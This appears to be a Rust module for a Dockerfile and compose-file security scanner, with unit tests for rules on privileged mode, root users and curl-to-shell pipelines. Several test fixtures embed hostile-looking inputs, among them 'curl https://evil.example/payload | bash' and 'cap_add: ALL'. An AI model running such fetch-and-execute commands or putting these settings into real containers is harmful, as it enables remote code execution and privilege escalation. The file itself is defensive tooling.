use crate::engine::scanner::{Scanner, ScannerConfig};
use crate::error::{AuditError, Result};
use crate::ignore::IgnoreFilter;
use crate::parser::DockerfileParser;
use crate::rules::Finding;
use std::fs;
use std::io;
use std::path::Path;
use walkdir::WalkDir;

pub struct DockerScanner {
    config: ScannerConfig,
}

impl_scanner_builder!(DockerScanner);
impl_content_scanner!(DockerScanner);

impl DockerScanner {
    pub fn with_ignore_filter(mut self, filter: IgnoreFilter) -> Self {
        self.config = self.config.with_ignore_filter(filter);
        self
    }

    fn is_dockerfile(path: &Path) -> bool {
        let file_name = path
            .file_name()
            .and_then(|n| n.to_str())
            .map(|n| n.to_lowercase());

        match file_name {
            Some(name) => {
                name == "dockerfile"
                    // `Dockerfile.<suffix>` variants: .staging, .base, .ci, … (#226)
                    || name.starts_with("dockerfile.")
                    || name.ends_with(".dockerfile")
                    || name == "docker-compose.yml"
                    || name == "docker-compose.yaml"
                    || name == "compose.yml"
                    || name == "compose.yaml"
            }
            None => false,
        }
    }
}

fn traversal_error(base: &Path, error: walkdir::Error) -> AuditError {
    AuditError::ReadError {
        path: error.path().map_or_else(
            || base.display().to_string(),
            |path| path.display().to_string(),
        ),
        source: io::Error::other(error.to_string()),
    }
}

impl DockerScanner {
    fn scan_walk_entries<I>(
        &self,
        dir: &Path,
        entries: I,
        dockerfile_names: &[&str],
        findings: &mut Vec<Finding>,
    ) -> Result<()>
    where
        I: IntoIterator<Item = std::result::Result<walkdir::DirEntry, walkdir::Error>>,
    {
        for entry in entries {
            let entry = match entry {
                Ok(entry) => entry,
                Err(error)
                    if error.path().is_some_and(|path| {
                        self.config
                            .ignore_filter()
                            .is_some_and(|filter| filter.is_ignored_directory(path))
                    }) =>
                {
                    continue;
                }
                Err(error) => return Err(traversal_error(dir, error)),
            };
            let path = entry.path();
            if path.is_file() && Self::is_dockerfile(path) && !self.config.is_ignored(path) {
                // Avoid scanning the same file twice
                let is_common_name = dockerfile_names.iter().any(|n| {
                    path.file_name()
                        .and_then(|f| f.to_str())
                        .is_some_and(|f| f == *n)
                });

                if !is_common_name || path.parent() != Some(dir) {
                    findings.extend(self.scan_file(path)?);
                }
            }
        }
        Ok(())
    }
}

impl Scanner for DockerScanner {
    fn scan_file(&self, path: &Path) -> Result<Vec<Finding>> {
        let content = self.config.read_file(path)?;
        let content = DockerfileParser::normalize_continuations(&content);
        let path_str = path.display().to_string();
        Ok(self.config.check_content(&content, &path_str))
    }

    fn scan_directory(&self, dir: &Path) -> Result<Vec<Finding>> {
        let mut findings = Vec::new();

        // Check for common Dockerfile locations
        let dockerfile_names = [
            "Dockerfile",
            "dockerfile",
            "Dockerfile.dev",
            "Dockerfile.prod",
            "docker-compose.yml",
            "docker-compose.yaml",
            "compose.yml",
            "compose.yaml",
        ];

        for name in &dockerfile_names {
            let docker_file = dir.join(name);
            if self.config.is_ignored(&docker_file) {
                continue;
            }
            match fs::metadata(&docker_file) {
                Ok(metadata) if metadata.is_file() => {
                    findings.extend(self.scan_file(&docker_file)?);
                }
                Ok(_) => {}
                Err(error) if error.kind() == io::ErrorKind::NotFound => {}
                Err(source) => {
                    return Err(AuditError::ReadError {
                        path: docker_file.display().to_string(),
                        source,
                    });
                }
            }
        }

        // Scan for any .dockerfile files in the directory
        let ignore_filter = self.config.ignore_filter().cloned();
        let entries = WalkDir::new(dir)
            .max_depth(3)
            .into_iter()
            .filter_entry(move |entry| {
                !ignore_filter.as_ref().is_some_and(|filter| {
                    entry.file_type().is_dir() && filter.is_ignored_directory(entry.path())
                })
            });
        self.scan_walk_entries(dir, entries, &dockerfile_names, &mut findings)?;

        Ok(findings)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::engine::scanner::ContentScanner;
    use std::fs;
    use tempfile::TempDir;

    fn create_dockerfile(dir: &TempDir, name: &str, content: &str) -> std::path::PathBuf {
        let path = dir.path().join(name);
        fs::write(&path, content).unwrap();
        path
    }

    #[test]
    fn test_scan_clean_dockerfile() {
        let dir = TempDir::new().unwrap();
        create_dockerfile(
            &dir,
            "Dockerfile",
            r#"
FROM node:18-alpine
WORKDIR /app
USER node
COPY . .
RUN npm install
CMD ["node", "index.js"]
"#,
        );

        let scanner = DockerScanner::new();
        let findings = scanner.scan_path(dir.path()).unwrap();

        // Should have no critical findings
        let critical: Vec<_> = findings
            .iter()
            .filter(|f| f.severity >= crate::rules::Severity::High)
            .collect();
        assert!(
            critical.is_empty(),
            "Clean Dockerfile should have no high/critical findings"
        );
    }

    #[test]
    fn test_detect_privileged_mode() {
        let dir = TempDir::new().unwrap();
        create_dockerfile(
            &dir,
            "docker-compose.yml",
            r#"
services:
  app:
    image: nginx
    privileged: true
"#,
        );

        let scanner = DockerScanner::new();
        let findings = scanner.scan_path(dir.path()).unwrap();

        assert!(
            findings.iter().any(|f| f.id == "DK-001"),
            "Should detect privileged: true"
        );
    }

    #[test]
    fn test_detects_backtick_continued_url_to_shell_pipeline() {
        let dir = TempDir::new().unwrap();
        let path = create_dockerfile(
            &dir,
            "Dockerfile",
            "# escape=`\nFROM alpine\nRUN curl https://evil.example/payload `\n    | bash\n",
        );

        let scanner = DockerScanner::new();
        let findings = scanner.scan_file(&path).unwrap();
        let finding = findings.iter().find(|finding| finding.id == "DK-003");

        assert!(finding.is_some(), "backtick continuation must be scanned");
        assert_eq!(finding.unwrap().location.line, 3);
    }

    #[test]
    fn test_backtick_in_default_shell_does_not_join_lines() {
        let dir = TempDir::new().unwrap();
        let path = create_dockerfile(
            &dir,
            "Dockerfile",
            "FROM alpine\nRUN echo `\n    && echo safe\n",
        );

        let scanner = DockerScanner::new();
        let findings = scanner.scan_file(&path).unwrap();

        assert!(findings.iter().all(|finding| finding.id != "DK-003"));
    }

    #[test]
    fn test_detect_root_user() {
        let dir = TempDir::new().unwrap();
        create_dockerfile(
            &dir,
            "Dockerfile",
            r#"
FROM ubuntu:22.04
USER root
RUN apt-get update
"#,
        );

        let scanner = DockerScanner::new();
        let findings = scanner.scan_path(dir.path()).unwrap();

        assert!(
            findings.iter().any(|f| f.id == "DK-002"),
            "Should detect USER root"
        );
    }

    #[test]
    fn test_detect_curl_pipe_bash_in_run() {
        let dir = TempDir::new().unwrap();
        create_dockerfile(
            &dir,
            "Dockerfile",
            r#"
FROM ubuntu:22.04
RUN curl -fsSL https://get.docker.com | bash
"#,
        );

        let scanner = DockerScanner::new();
        let findings = scanner.scan_path(dir.path()).unwrap();

        assert!(
            findings.iter().any(|f| f.id == "DK-003"),
            "Should detect curl | bash in RUN"
        );
    }

    #[test]
    fn test_scan_compose_yaml() {
        let dir = TempDir::new().unwrap();
        create_dockerfile(
            &dir,
            "compose.yaml",
            r#"
services:
  db:
    image: postgres
    cap_add:
      - SYS_ADMIN
"#,
        );

        let scanner = DockerScanner::new();
        let findings = scanner.scan_path(dir.path()).unwrap();

        assert!(
            findings.iter().any(|f| f.id == "DK-001"),
            "Should detect SYS_ADMIN capability"
        );
    }

    #[test]
    fn test_scan_custom_dockerfile() {
        let dir = TempDir::new().unwrap();
        create_dockerfile(
            &dir,
            "app.dockerfile",
            r#"
FROM node:18
USER root
RUN npm install
"#,
        );

        let scanner = DockerScanner::new();
        let findings = scanner.scan_path(dir.path()).unwrap();

        assert!(
            findings.iter().any(|f| f.id == "DK-002"),
            "Should detect USER root in custom.dockerfile"
        );
    }

    #[test]
    fn test_scan_dockerfile_suffix_variant() {
        // Regression (#226): `Dockerfile.<env>` variants must be scanned.
        let dir = TempDir::new().unwrap();
        create_dockerfile(
            &dir,
            "Dockerfile.staging",
            r#"
FROM node:18
USER root
RUN curl -fsSL https://get.docker.com | bash
"#,
        );

        let scanner = DockerScanner::new();
        let findings = scanner.scan_path(dir.path()).unwrap();

        assert!(
            findings.iter().any(|f| f.id == "DK-002"),
            "Should detect USER root in Dockerfile.staging"
        );
    }

    #[test]
    fn test_scan_empty_directory() {
        let dir = TempDir::new().unwrap();
        let scanner = DockerScanner::new();
        let findings = scanner.scan_path(dir.path()).unwrap();
        assert!(findings.is_empty());
    }

    #[test]
    fn test_scan_nonexistent_path() {
        let scanner = DockerScanner::new();
        let result = scanner.scan_path(Path::new("/nonexistent/path"));
        assert!(result.is_err());
    }

    #[test]
    fn test_scan_file_directly() {
        let dir = TempDir::new().unwrap();
        let path = create_dockerfile(
            &dir,
            "Dockerfile",
            r#"
FROM ubuntu:22.04
RUN docker run --privileged nginx
"#,
        );

        let scanner = DockerScanner::new();
        let findings = scanner.scan_file(&path).unwrap();

        assert!(findings.iter().any(|f| f.id == "DK-001"));
    }

    #[test]
    fn test_default_trait() {
        let scanner = DockerScanner::default();
        let dir = TempDir::new().unwrap();
        let findings = scanner.scan_path(dir.path()).unwrap();
        assert!(findings.is_empty());
    }

    #[test]
    fn test_scan_content_directly() {
        let scanner = DockerScanner::new();
        let findings = scanner
            .scan_content("privileged: true", "compose.yml")
            .unwrap();
        assert!(findings.iter().any(|f| f.id == "DK-001"));
    }

    #[test]
    fn test_is_dockerfile() {
        assert!(DockerScanner::is_dockerfile(Path::new("Dockerfile")));
        assert!(DockerScanner::is_dockerfile(Path::new("dockerfile")));
        assert!(DockerScanner::is_dockerfile(Path::new("app.dockerfile")));
        assert!(DockerScanner::is_dockerfile(Path::new(
            "docker-compose.yml"
        )));
        assert!(DockerScanner::is_dockerfile(Path::new(
            "docker-compose.yaml"
        )));
        assert!(DockerScanner::is_dockerfile(Path::new("compose.yml")));
        assert!(DockerScanner::is_dockerfile(Path::new("compose.yaml")));
        // Regression (#226): Dockerfile.<suffix> variants.
        assert!(DockerScanner::is_dockerfile(Path::new(
            "Dockerfile.staging"
        )));
        assert!(DockerScanner::is_dockerfile(Path::new("Dockerfile.base")));
        assert!(DockerScanner::is_dockerfile(Path::new("Dockerfile.ci")));
        assert!(DockerScanner::is_dockerfile(Path::new("dockerfile.prod")));
        assert!(!DockerScanner::is_dockerfile(Path::new("README.md")));
        assert!(!DockerScanner::is_dockerfile(Path::new("script.sh")));
        assert!(!DockerScanner::is_dockerfile(Path::new("mydockerfile.txt")));
    }

    #[test]
    fn test_scan_file_read_error() {
        let dir = TempDir::new().unwrap();
        let scanner = DockerScanner::new();
        let result = scanner.scan_file(dir.path());
        assert!(result.is_err());
    }

    #[test]
    fn test_scan_directory_propagates_root_dockerfile_size_error() {
        let dir = TempDir::new().unwrap();
        create_dockerfile(&dir, "Dockerfile", "FROM alpine\n");

        let scanner = DockerScanner::new().with_max_file_size(1);
        let result = scanner.scan_path(dir.path());

        assert!(matches!(
            result,
            Err(crate::error::AuditError::FileTooLarge { ref path, .. })
                if path.ends_with("Dockerfile")
        ));
    }

    #[test]
    fn test_scan_directory_propagates_nested_dockerfile_and_compose_errors() {
        for name in ["Dockerfile", "compose.yaml"] {
            let dir = TempDir::new().unwrap();
            let nested = dir.path().join("services").join("api");
            fs::create_dir_all(&nested).unwrap();
            fs::write(nested.join(name), "FROM alpine\n").unwrap();

            let scanner = DockerScanner::new().with_max_file_size(1);
            let result = scanner.scan_path(dir.path());

            assert!(matches!(
                result,
                Err(crate::error::AuditError::FileTooLarge { ref path, .. })
                    if path.ends_with(name)
            ));
        }
    }

    #[test]
    fn test_scan_directory_preserves_ignored_dockerfiles() {
        let dir = TempDir::new().unwrap();
        let ignored = dir.path().join("vendor");
        fs::create_dir_all(&ignored).unwrap();
        fs::write(ignored.join("Dockerfile"), "FROM alpine\nUSER root\n").unwrap();

        let ignore_config = crate::config::IgnoreConfig {
            patterns: vec!["**/vendor/**".to_string()],
        };
        let scanner = DockerScanner::new()
            .with_ignore_filter(crate::ignore::IgnoreFilter::from_config(&ignore_config));
        let findings = scanner.scan_path(dir.path()).unwrap();

        assert!(
            findings.is_empty(),
            "ignored Dockerfiles must remain ignored"
        );
    }

    #[test]
    fn test_traversal_error_keeps_path_context() {
        let dir = TempDir::new().unwrap();
        let missing = dir.path().join("missing");
        let error = WalkDir::new(&missing)
            .into_iter()
            .next()
            .expect("walk must yield an error")
            .expect_err("missing root must produce a traversal error");

        let mapped = traversal_error(dir.path(), error);
        assert!(
            matches!(mapped, AuditError::ReadError { ref path, .. } if path.ends_with("missing"))
        );
    }

    #[test]
    fn test_scan_walk_entries_propagates_injected_traversal_error() {
        let dir = TempDir::new().unwrap();
        let missing = dir.path().join("vendor").join("missing");
        let traversal = WalkDir::new(&missing).into_iter();
        let mut findings = Vec::new();

        let result = DockerScanner::new().scan_walk_entries(
            dir.path(),
            traversal,
            &["Dockerfile"],
            &mut findings,
        );

        assert!(matches!(
            result,
            Err(AuditError::ReadError { ref path, .. }) if path.ends_with("missing")
        ));
    }

    #[test]
    fn test_scan_walk_entries_ignores_traversal_error_in_ignored_subtree() {
        let dir = TempDir::new().unwrap();
        let missing = dir.path().join("vendor").join("missing");
        let traversal = WalkDir::new(&missing).into_iter();
        let ignore_config = crate::config::IgnoreConfig {
            patterns: vec!["**/vendor/**".to_string()],
        };
        let scanner = DockerScanner::new()
            .with_ignore_filter(crate::ignore::IgnoreFilter::from_config(&ignore_config));
        let mut findings = Vec::new();

        let result =
            scanner.scan_walk_entries(dir.path(), traversal, &["Dockerfile"], &mut findings);

        assert!(result.is_ok());
        assert!(findings.is_empty());
    }

    #[test]
    fn test_common_dockerfile_directory_is_not_read_as_file() {
        let dir = TempDir::new().unwrap();
        fs::create_dir(dir.path().join("Dockerfile")).unwrap();

        let findings = DockerScanner::new().scan_path(dir.path()).unwrap();
        assert!(findings.is_empty());
    }

    #[test]
    fn test_scan_nested_dockerfile() {
        let dir = TempDir::new().unwrap();
        let subdir = dir.path().join("services").join("api");
        fs::create_dir_all(&subdir).unwrap();
        let path = subdir.join("Dockerfile");
        fs::write(&path, "FROM ubuntu\nUSER root").unwrap();

        let scanner = DockerScanner::new();
        let findings = scanner.scan_path(dir.path()).unwrap();

        assert!(
            findings.iter().any(|f| f.id == "DK-002"),
            "Should detect USER root in nested Dockerfile"
        );
    }

    #[test]
    fn test_detect_cap_add_all() {
        let dir = TempDir::new().unwrap();
        create_dockerfile(
            &dir,
            "docker-compose.yml",
            r#"
services:
  app:
    image: nginx
    cap_add:
      - ALL
"#,
        );

        let scanner = DockerScanner::new();
        let findings = scanner.scan_path(dir.path()).unwrap();

        assert!(
            findings.iter().any(|f| f.id == "DK-001"),
            "Should detect cap_add: ALL"
        );
    }

    #[cfg(unix)]
    #[test]
    fn test_scan_path_not_file_or_directory() {
        use std::process::Command;

        let dir = TempDir::new().unwrap();
        let fifo_path = dir.path().join("test_fifo");

        let status = Command::new("mkfifo")
            .arg(&fifo_path)
            .status()
            .expect("Failed to create FIFO");

        if status.success() && fifo_path.exists() {
            let scanner = DockerScanner::new();
            let result = scanner.scan_path(&fifo_path);
            assert!(result.is_err());
        }
    }
}
